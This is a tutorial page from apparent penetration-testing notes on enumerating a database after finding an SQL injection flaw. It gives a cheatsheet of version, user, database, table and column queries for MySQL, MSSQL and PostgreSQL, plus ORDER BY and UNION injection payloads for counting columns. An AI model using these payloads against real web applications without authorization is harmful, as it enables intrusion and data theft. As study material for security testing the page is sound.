---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Enumeration

**Even after identifying an SQL injection vulnerability, determining the underlying Database Management System (DBMS) may not be immediately clear.** This is because different DBMSs can exhibit similar behaviors, making it difficult to distinguish between them based solely on the vulnerability itself.

To address this, further enumeration is needed to identify the specific DBMS in use. This is crucial because the DBMS determines the structure, syntax, and security measures, which guide the next steps in exploitation.

Once the DBMS is confirmed, we can move forward with enumerating the databases, tables, and columns for useful information.

***

## Cheatsheet

| Action                                                                                                                                                                                                                                                                                                 | Description                                                                       |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------- |
| <p>MySQL, MSSQL:<br><code>SELECT @@version</code><br><br>PostgreSQL:<br><code>SELECT version()</code></p>                                                                                                                                                                                              | Get the database type and version.                                                |
| <p>MySQL:<br><code>SELECT USER();</code><br><code>SELECT CURRENT_USER();</code><br><code>SELECT user from mysql.user;</code> (Will list all users)<br><br>MSSQL:<br><code>SELECT USER_NAME();</code><br><br>PostgreSQL:<br><code>SELECT CURRENT_USER();</code></p>                                     | Retrieve the current user under whose privileges the commands are being executed. |
| <p>MySQL:<br><code>SELECT schema_name FROM information_schema.schemata;</code><br><br>MSSQL:<br><code>SELECT name FROM sys.databases;</code><br><br>PostgreSQL:<br><code>SELECT datname FROM pg_database;</code></p>                                                                                   | List all available databases.                                                     |
| <p>MySQL, MSSQL, PostgreSQL:<br><code>SELECT table_name, table_schema FROM information_schema.tables</code></p>                                                                                                                                                                                        | <p>Retrieve a list of tables (table schema indicates the database).<br></p>       |
| <p>MySQL, MSSQL, PostgreSQL:<br><code>SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '&#x3C;table>'</code></p>                                                                                                                                                       | Retrieve a list of columns for a specific table.                                  |
| <p>MySQL:<br><code>SELECT &#x3C;column> FROM &#x3C;database>.&#x3C;table>;</code><br><br>MSSQL:<br><code>SELECT &#x3C;column> FROM &#x3C;database>.</code></p><p><code>&#x3C;schema>.&#x3C;table>;</code><br><br>PostgreSQL:<br><code>SELECT &#x3C;column> FROM &#x3C;schema>.&#x3C;table>;</code></p> | Retrieve data from a specific column in a table.                                  |

***

## Column Enumeration

To find the number of columns selected by the server. There are two methods of detecting the number of columns:

* Using `ORDER BY`
* Using `UNION`

### ORDER BY

To find the count of columns for a table inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

Start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column.Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns. If it fails at `order by 4`, this means the table has three columns.

```sql
' order by 1-- 
```

{% hint style="info" %}
Ensure that the white-space ' ' at the end of the comment is included.
{% endhint %}

### UNION

The 'ORDER BY' method always returns the results until we hit an error, while this method always gives an error until we get a success.

Injecting a 3 column `UNION` query:

```sql
' UNION select 1,2,3-- 
```
